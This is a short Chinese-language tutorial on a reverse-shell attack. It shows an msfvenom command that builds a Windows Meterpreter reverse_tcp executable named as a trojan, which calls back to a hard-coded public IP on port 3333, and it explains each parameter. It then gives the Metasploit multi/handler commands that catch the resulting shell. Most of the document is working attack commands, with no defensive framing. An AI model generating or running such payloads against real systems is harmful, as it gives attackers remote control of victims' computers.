反弹shell操作案例
生成木马
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=47.94.236.114 LPORT=3333 -f exe -o msf.exe
```
参数解释：
    msfvenom：Metasploit 中用于生成 payload 的命令行工具。

    -p windows/meterpreter/reverse_tcp：指定使用的 payload 类型。这表示生成一个 Windows 平台的反向 TCP Meterpreter shell。meterpreter/reverse_tcp 会使目标计算机连接回攻击者的主机，提供一个远程控制的命令行。

    LHOST=47.94.236.114：指定攻击者的主机 IP 地址，目标计算机会向这个 IP 地址发起连接。

    LPORT=3333：指定攻击者主机上的监听端口，目标计算机会连接到这个端口。

    -f exe：指定输出格式为 Windows 可执行文件（.exe）。

    -o msf.exe：指定输出文件的名称为 msf.exe。

msf监听反弹shell
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp   //这里的payload要和上面的一直0
set lport 3333
set lhost 0.0.0.0
run
```
set lport 3333：

    设置监听端口（LPORT）为 3333，这意味着 Meterpreter 会在目标机器上连接到你本地机器的 3333 端口。

set lhost 0.0.0.0：

    设置本地主机 IP（LHOST）为 0.0.0.0，这表示监听所有可用的网络接口。